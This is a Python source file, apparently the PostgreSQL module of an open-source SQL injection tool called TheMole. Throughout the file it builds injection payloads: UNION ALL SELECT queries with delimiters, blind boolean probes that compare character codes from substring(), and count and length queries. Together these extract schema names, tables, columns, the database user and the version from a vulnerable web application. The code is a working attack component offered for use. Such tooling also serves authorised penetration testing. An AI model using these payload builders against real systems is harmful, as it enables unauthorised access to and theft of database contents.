#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from dbmsmoles import DbmsMole, FingerBase

class PostgresMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.chr_join(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.chr_join(inner_delimiter_result)
    
    def to_string(self, data):
        return DbmsMole.chr_join(data)
        
    def _schemas_query_info(self):
        return {
            'table' : 'pg_tables',
            'field' : 'distinct(schemaname)'
        }
    
    def _tables_query_info(self, db):
        return {
            'table' : 'pg_tables',
            'field' : 'tablename',
            'filter': "schemaname = '{db}'".format(db=db)
        }
    
    def _columns_query_info(self, db, table):
        return {
            'table' : 'pg_namespace,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid',
            'field' : 'attname',
            'filter': "a.relnamespace=pg_namespace.oid AND attnum>0 AND nspname='{db}' AND a.relname='{table}'".format(db=db, table=table)
        }
        
    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : db + '.' + table,
            'field' : ','.join(fields),
            'filter': where
        }
        
    def _dbinfo_query_info(self):
        return {
            'field' : 'getpgusername(),version(),current_database()', 
            'table' : ''
        }
        
    def forge_blind_query(self, index, value, field, table, where="1=1", offset=0):
        if table == 'pg_tables' and where == "1=1" and field == 'distinct(schemaname)':
            return ' and {op_par}' + str(value) + ' < (select distinct on(schemaname) ascii(substring(schemaname, '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
        else:
            return DbmsMole.forge_blind_query(self, index, value, field, table, where, offset)
        
        
    def forge_blind_count_query(self, operator, value, table, where="1=1"):
        if table == 'pg_tables' and where == "1=1":
            return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(distinct(schemaname)) from '+table+' where '+self.parse_condition(where)+')'
        else:
            return DbmsMole.forge_blind_count_query(self, operator, value, table, where)

    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
        if table == 'pg_tables' and where == "1=1" and field == 'distinct(schemaname)':
            return ' and {op_par}' + str(value) + ' ' + operator + ' (select distinct on(schemaname) length(schemaname) from '+table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
        else:
            return DbmsMole.forge_blind_len_query(self, operator, value, field, table, where, offset)

    @classmethod
    def dbms_name(cls):
        return 'Postgres'
    
    @classmethod
    def blind_field_delimiter(cls):
        return PostgresMole.inner_delimiter_result
    
    @classmethod
    def dbms_check_blind_query(cls):
        return ' and {op_par}0 < (select length(getpgusername()))'
    
    def forge_query(self, column_count, fields, table_name, injectable_field, where = None, offset = 0):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(self.query)
        # It's not beatiful but it works :D
        if fields == 'distinct(schemaname)':
            query += " distinct on(schemaname) "
            fields = 'schemaname'
        query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||(" +
                                            ('||' + PostgresMole.inner_delimiter + '||').join(fields.split(',')) +
                                            ")||" + PostgresMole.out_delimiter + ")"
                                        )
    
        query += ','.join(query_list)
        at_end = ''
        if len(table_name) > 0:
            query += " from " + table_name 
            at_end = " limit 1 offset " + str(offset)
        if not where is None:
            query += " where " + self.parse_condition(where)
        query += at_end
        return query
        
    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        output = []
        hashes = []
        to_search = []
        for i in range(query_columns):
            hashes.append('(' + DbmsMole.chr_join(str(base + i)) + ')::unknown')
            to_search.append(str(base + i))
        output.append(FingerBase(hashes, to_search))
        for i in range(query_columns):
            hashes = list(map(lambda x: 'null', range(query_columns)))
            to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
            to_search[i] = str(base + i)
            hashes[i] = '(' + DbmsMole.chr_join(str(base + i)) + ')::unknown'
            output.append(FingerBase(list(hashes), to_search))
            hashes[i] = '(' + DbmsMole.chr_join(str(base + i)) + ')'
            output.append(FingerBase(hashes, to_search))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(DbmsMole.char_concat(str(i)))
        to_search = list(map(str, range(base, base + query_columns)))
        output.append(FingerBase(list(hashes), to_search))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(str(i))
        output.append(FingerBase(list(hashes), to_search))
        return output
    
    @classmethod
    def field_finger_query(cls, columns, finger, injectable_field):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(finger._query)
        query_list[injectable_field] = "(getpgusername()||" + DbmsMole.chr_join(DbmsMole.field_finger_str) + ")"
        query += ",".join(query_list)
        return query

    def set_good_finger(self, finger):
        self.query = finger._query

    def _concat_fields(self, fields):
        return ('||' + PostgresMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(' + x + ',CHR(32))', fields))

    def _db_name(self, db):
        if db.startswith('postgres'):
            return 'pg_catalog'
        else:
            return 'public'

    def parse_results(self, url_data):
        data_list = url_data.split(PostgresMole.out_delimiter_result)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(PostgresMole.inner_delimiter_result)
    
    def __str__(self):
        return "Posgresql Mole"